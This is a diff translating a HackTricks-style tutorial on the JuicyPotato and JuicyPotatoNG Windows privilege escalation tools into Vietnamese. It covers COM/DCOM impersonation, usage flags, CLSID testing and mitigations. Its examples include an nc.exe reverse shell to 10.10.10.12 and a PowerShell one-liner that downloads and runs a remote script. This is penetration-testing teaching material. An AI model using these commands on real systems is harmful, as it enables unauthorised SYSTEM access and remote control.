@@ -2,59 +2,59 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-> [!WARNING] > JuicyPotato is legacy. It generally works on Windows versions up to Windows 10 1803 / Windows Server 2016. Microsoft changes shipped starting in Windows 10 1809 / Server 2019 broke the original technique. For those builds and newer, consider modern alternatives such as PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato and others. See the page below for up-to-date options and usage.
+> [!WARNING] > JuicyPotato đã lỗi thời. Công cụ này thường hoạt động trên các phiên bản Windows đến Windows 10 1803 / Windows Server 2016. Những thay đổi Microsoft phát hành từ Windows 10 1809 / Server 2019 đã làm kỹ thuật gốc không còn hoạt động. Với các bản dựng đó và mới hơn, hãy cân nhắc các giải pháp thay thế hiện đại như PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato và các công cụ khác. Xem trang bên dưới để biết các lựa chọn và cách sử dụng mới nhất.
 
 {{#ref}}
 roguepotato-and-printspoofer.md
 {{#endref}}
 
-## Juicy Potato (abusing the golden privileges) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>
+## Juicy Potato (lạm dụng các đặc quyền vàng) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>
 
-_A sugared version of_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, with a bit of juice, i.e. **another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM**_<sup>[[1]](#references)</sup>
+_Một phiên bản cải tiến của_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, thêm chút “nước ép”, tức là **một công cụ Local Privilege Escalation khác, giúp chuyển từ Windows Service Accounts lên NT AUTHORITY\SYSTEM**_<sup>[[1]](#references)</sup>
 
-#### You can download juicypotato from [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)
+#### Bạn có thể tải juicypotato tại [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)
 
-### Compatibility quick notes
+### Ghi chú nhanh về khả năng tương thích
 
-- Works reliably up to Windows 10 1803 and Windows Server 2016 when the current context has SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege.
-- Broken by Microsoft hardening in Windows 10 1809 / Windows Server 2019 and later. Prefer the alternatives linked above for those builds.
+- Hoạt động ổn định đến Windows 10 1803 và Windows Server 2016 khi ngữ cảnh hiện tại có SeImpersonatePrivilege hoặc SeAssignPrimaryTokenPrivilege.
+- Bị Microsoft vô hiệu hóa bằng các biện pháp hardening trong Windows 10 1809 / Windows Server 2019 trở lên. Với các bản dựng này, hãy ưu tiên những lựa chọn thay thế được liên kết ở trên.
 
-### Summary <a href="#summary" id="summary"></a>
+### Tóm tắt <a href="#summary" id="summary"></a>
 
-[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**<sup>[[1]](#references)</sup>
+[**Trích từ Readme của Juicy Potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**<sup>[[1]](#references)</sup>
 
-[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) and its [variants](https://github.com/decoder-it/lonelypotato) leverages the privilege escalation chain based on [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) having the MiTM listener on `127.0.0.1:6666` and when you have `SeImpersonate` or `SeAssignPrimaryToken` privileges. During a Windows build review we found a setup where `BITS` was intentionally disabled and port `6666` was taken.
+[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) và các [biến thể](https://github.com/decoder-it/lonelypotato) của nó khai thác chuỗi leo thang đặc quyền dựa trên dịch vụ [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>), [dịch vụ](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) có MiTM listener tại `127.0.0.1:6666`, khi bạn có đặc quyền `SeImpersonate` hoặc `SeAssignPrimaryToken`. Trong quá trình đánh giá một bản dựng Windows, chúng tôi phát hiện một thiết lập trong đó `BITS` bị vô hiệu hóa có chủ đích và cổng `6666` đã được sử dụng.
 
-We decided to weaponize [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Say hello to Juicy Potato**.
+Chúng tôi quyết định vũ khí hóa [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Hãy chào đón Juicy Potato**.
 
-> For the theory, see [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) and follow the chain of links and references.<sup>[[4]](#references)</sup>
+> Để tìm hiểu lý thuyết, xem [Rotten Potato - Leo thang đặc quyền từ Service Accounts lên SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) và lần theo chuỗi liên kết cùng tài liệu tham khảo.<sup>[[4]](#references)</sup>
 
-Besides `BITS`, several COM servers can be abused. They only need to:
+Ngoài `BITS`, có thể lạm dụng một số COM server. Chúng chỉ cần:
 
-1. be instantiable by the current user, normally a “service user” which has impersonation privileges
-2. implement the `IMarshal` interface
-3. run as an elevated user (SYSTEM, Administrator, …)
+1. có thể được khởi tạo bởi người dùng hiện tại, thường là “service user” có đặc quyền impersonation
+2. triển khai giao diện `IMarshal`
+3. chạy với tư cách người dùng có đặc quyền cao (SYSTEM, Administrator, …)
 
-After some testing we obtained and tested an extensive list of [interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/) on several Windows versions.
+Sau một số thử nghiệm, chúng tôi đã thu thập và kiểm tra một danh sách phong phú các [CLSID đáng chú ý](http://ohpe.it/juicy-potato/CLSID/) trên một số phiên bản Windows.
 
-### Juicy details <a href="#juicy-details" id="juicy-details"></a>
+### Chi tiết về Juicy <a href="#juicy-details" id="juicy-details"></a>
 
-JuicyPotato allows you to:<sup>[[1]](#references)</sup>
+JuicyPotato cho phép bạn:<sup>[[1]](#references)</sup>
 
-- **Target CLSID** _pick any CLSID you want._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _you can find the list organized by OS._
-- **COM Listening port** _define COM listening port you prefer (instead of the marshalled hardcoded 6666)_
-- **COM Listening IP address** _bind the server on any IP_
-- **Process creation mode** _depending on the impersonated user’s privileges you can choose from:_
-  - `CreateProcessWithToken` (needs `SeImpersonate`)
-  - `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
+- **Target CLSID** _chọn CLSID bất kỳ._ [_Tại đây_](http://ohpe.it/juicy-potato/CLSID/) _có danh sách được sắp xếp theo OS._
+- **COM Listening port** _chọn cổng COM listening mà bạn muốn (thay vì cổng 6666 được hardcode trong marshalled)_
+- **COM Listening IP address** _bind server vào bất kỳ IP nào_
+- **Process creation mode** _tùy theo đặc quyền của người dùng bị impersonate, bạn có thể chọn:_
+  - `CreateProcessWithToken` (cần `SeImpersonate`)
+  - `CreateProcessAsUser` (cần `SeAssignPrimaryToken`)
   - `both`
-- **Process to launch** _launch an executable or script if the exploitation succeeds_
-- **Process Argument** _customize the launched process arguments_
-- **RPC Server address** _for a stealthy approach you can authenticate to an external RPC server_
-- **RPC Server port** _useful if you want to authenticate to an external server and firewall is blocking port `135`…_
-- **TEST mode** _mainly for testing purposes, i.e. testing CLSIDs. It creates the DCOM and prints the user of token. See_ [_here for testing_](http://ohpe.it/juicy-potato/Test/)
+- **Process to launch** _chạy một executable hoặc script nếu khai thác thành công_
+- **Process Argument** _tùy chỉnh các tham số của process được chạy_
+- **RPC Server address** _để hoạt động kín đáo, bạn có thể xác thực với một RPC server bên ngoài_
+- **RPC Server port** _hữu ích nếu bạn muốn xác thực với server bên ngoài và firewall đang chặn cổng `135`…_
+- **TEST mode** _chủ yếu dùng để kiểm thử, chẳng hạn kiểm tra CLSID. Chế độ này tạo DCOM và in ra người dùng của token. Xem_ [_tại đây để kiểm thử_](http://ohpe.it/juicy-potato/Test/)
 
-### Usage <a href="#usage" id="usage"></a>
+### Cách sử dụng <a href="#usage" id="usage"></a>
 
 ```
 T:\>JuicyPotato.exe
@@ -73,30 +73,30 @@ Optional args:
 -n <port>: RPC server listen port (default 135)
 ```
 
-### Final thoughts <a href="#final-thoughts" id="final-thoughts"></a>
+### Những suy nghĩ cuối cùng <a href="#final-thoughts" id="final-thoughts"></a>
 
-[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**<sup>[[1]](#references)</sup>
+[**Từ Readme của juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**<sup>[[1]](#references)</sup>
 
-If the user has `SeImpersonate` or `SeAssignPrimaryToken` privileges then you are **SYSTEM**.
+Nếu người dùng có quyền `SeImpersonate` hoặc `SeAssignPrimaryToken` thì bạn có quyền **SYSTEM**.
 
-It’s nearly impossible to prevent the abuse of all these COM Servers. You could think about modifying the permissions of these objects via `DCOMCNFG` but good luck, this is gonna be challenging.
+Gần như không thể ngăn chặn việc lạm dụng tất cả các COM Server này. Bạn có thể cân nhắc sửa đổi quyền của các đối tượng này thông qua `DCOMCNFG`, nhưng chúc may mắn — việc này sẽ rất khó khăn.
 
-The actual solution is to protect sensitive accounts and applications which run under the `* SERVICE` accounts. Stopping `DCOM` would certainly inhibit this exploit but could have a serious impact on the underlying OS.
+Giải pháp thực sự là bảo vệ các tài khoản và ứng dụng nhạy cảm chạy dưới các tài khoản `* SERVICE`. Vô hiệu hóa `DCOM` chắc chắn sẽ ngăn chặn được khai thác này, nhưng có thể ảnh hưởng nghiêm trọng đến hệ điều hành nền tảng.
 
-From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)<sup>[[3]](#references)</sup>
+Nguồn: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)<sup>[[3]](#references)</sup>
 
 ## JuicyPotatoNG (2022+)
 
-JuicyPotatoNG re-introduces a JuicyPotato-style local privilege escalation on modern Windows by combining:<sup>[[2]](#references)</sup>
-- DCOM OXID resolution to a local RPC server on a chosen port, avoiding the old hardcoded 127.0.0.1:6666 listener.
-- An SSPI hook to capture and impersonate the inbound SYSTEM authentication without requiring RpcImpersonateClient, which also enables CreateProcessAsUser when only SeAssignPrimaryTokenPrivilege is present.
-- Tricks to satisfy DCOM activation constraints (e.g., the former INTERACTIVE-group requirement when targeting PrintNotify / ActiveX Installer Service classes).
+JuicyPotatoNG tái giới thiệu kỹ thuật leo thang đặc quyền cục bộ kiểu JuicyPotato trên các phiên bản Windows hiện đại bằng cách kết hợp:<sup>[[2]](#references)</sup>
+- DCOM OXID resolution đến một RPC server cục bộ trên cổng được chọn, tránh listener cũ được hardcode tại 127.0.0.1:6666.
+- Một SSPI hook để thu thập và mạo danh xác thực SYSTEM gửi đến mà không cần RpcImpersonateClient; cách này cũng cho phép dùng CreateProcessAsUser khi chỉ có SeAssignPrimaryTokenPrivilege.
+- Các thủ thuật đáp ứng những ràng buộc kích hoạt DCOM (ví dụ: yêu cầu trước đây về nhóm INTERACTIVE khi nhắm đến các lớp PrintNotify / ActiveX Installer Service).
 
-Important notes (evolving behavior across builds):<sup>[[2]](#references)</sup>
-- September 2022: Initial technique worked on supported Windows 10/11 and Server targets using the “INTERACTIVE trick”.
-- January 2023 update from the authors: Microsoft later blocked the INTERACTIVE trick. A different CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) restores exploitation but only on Windows 11 / Server 2022 according to their post.
+Các lưu ý quan trọng (hành vi thay đổi giữa các bản dựng):<sup>[[2]](#references)</sup>
+- Tháng 9 năm 2022: Kỹ thuật ban đầu hoạt động trên các mục tiêu Windows 10/11 và Server được hỗ trợ bằng cách dùng “INTERACTIVE trick”.
+- Bản cập nhật từ các tác giả vào tháng 1 năm 2023: Sau đó, Microsoft đã chặn INTERACTIVE trick. Theo bài đăng của họ, một CLSID khác ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) khôi phục khả năng khai thác, nhưng chỉ trên Windows 11 / Server 2022.
 
-Basic usage (more flags in the help):
+Cách sử dụng cơ bản (xem trợ giúp để biết thêm các flag):
 
 ```
 JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"  
@@ -106,13 +106,13 @@ JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
 #  -i  Interactive console (only with CreateProcessAsUser)
 ```
 
-If you’re targeting Windows 10 1809 / Server 2019 where classic JuicyPotato is patched, prefer the alternatives linked at the top (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, etc.). NG may be situational depending on build and service state.
+Nếu nhắm đến Windows 10 1809 / Server 2019, nơi JuicyPotato cổ điển đã bị vá, hãy ưu tiên các phương án thay thế được liên kết ở đầu (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, v.v.). NG có thể chỉ phù hợp trong một số trường hợp, tùy thuộc vào build và trạng thái dịch vụ.
 
-## Examples
+## Ví dụ
 
-Note: Visit [this page](https://ohpe.it/juicy-potato/CLSID/) for a list of CLSIDs to try.
+Lưu ý: Truy cập [trang này](https://ohpe.it/juicy-potato/CLSID/) để xem danh sách CLSID có thể thử.
 
-### Get a nc.exe reverse shell
+### Mở reverse shell bằng nc.exe
 
 ```
 c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *
@@ -133,31 +133,30 @@ c:\Users\Public>
 .\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
 ```
 
-### Launch a new CMD (if you have RDP access)
+### Khởi chạy CMD mới (nếu bạn có quyền truy cập RDP)
 
-![Powershell rev - Launch a new CMD (if you have RDP access): Launch a new CMD (if you have RDP access)](<../../images/image (300).png>)
+![Powershell rev - Khởi chạy CMD mới (nếu bạn có quyền truy cập RDP): Khởi chạy CMD mới (nếu bạn có quyền truy cập RDP)](<../../images/image (300).png>)
 
-## CLSID Problems
+## Sự cố CLSID
 
-Oftentimes, the default CLSID that JuicyPotato uses **doesn't work** and the exploit fails. Usually, it takes multiple attempts to find a **working CLSID**. To get a list of CLSIDs to try for a specific operating system, you should visit this page:
+Thông thường, CLSID mặc định mà JuicyPotato sử dụng **không hoạt động** và exploit thất bại. Thường cần thử nhiều lần mới tìm được **CLSID hoạt động**. Để lấy danh sách CLSID cần thử cho một hệ điều hành cụ thể, hãy truy cập trang này:
 
 - [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)
 
-### **Checking CLSIDs**
+### **Kiểm tra CLSID**
 
-First, you will need some executables apart from juicypotato.exe.
+Trước tiên, bạn cần một số executable ngoài juicypotato.exe.
 
-Download [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) and load it into your PS session, and download and execute [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). That script will create a list of possible CLSIDs to test.
+Tải [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) và nạp nó vào phiên PS của bạn, sau đó tải và thực thi [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Script này sẽ tạo danh sách CLSID có thể thử.
 
-Then download [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(change the path to the CLSID list and to the juicypotato executable) and execute it. It will start trying every CLSID, and **when the port number changes, it will mean that the CLSID worked**.
+Tiếp theo, tải [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(thay đổi đường dẫn đến danh sách CLSID và executable juicypotato), rồi thực thi nó. Script sẽ lần lượt thử từng CLSID, và **khi số cổng thay đổi, điều đó có nghĩa là CLSID đã hoạt động**.
 
-**Check** the working CLSIDs **using the parameter -c**
+**Kiểm tra** các CLSID hoạt động **bằng tham số -c**
 
 ## References
 
-- [1] [Juicy Potato README (ohpe/juicy-potato)](https://github.com/ohpe/juicy-potato/blob/master/README.md)
-- [2] [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
-- [3] [Juicy Potato project page (ohpe.it)](http://ohpe.it/juicy-potato/)
-- [4] [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
-
+- [1] [README của Juicy Potato (ohpe/juicy-potato)](https://github.com/ohpe/juicy-potato/blob/master/README.md)
+- [2] [Trao cho JuicyPotato cơ hội thứ hai: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
+- [3] [Trang dự án Juicy Potato (ohpe.it)](http://ohpe.it/juicy-potato/)
+- [4] [Rotten Potato - Leo thang đặc quyền từ tài khoản dịch vụ lên SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
 {{#include ../../banners/hacktricks-training.md}}
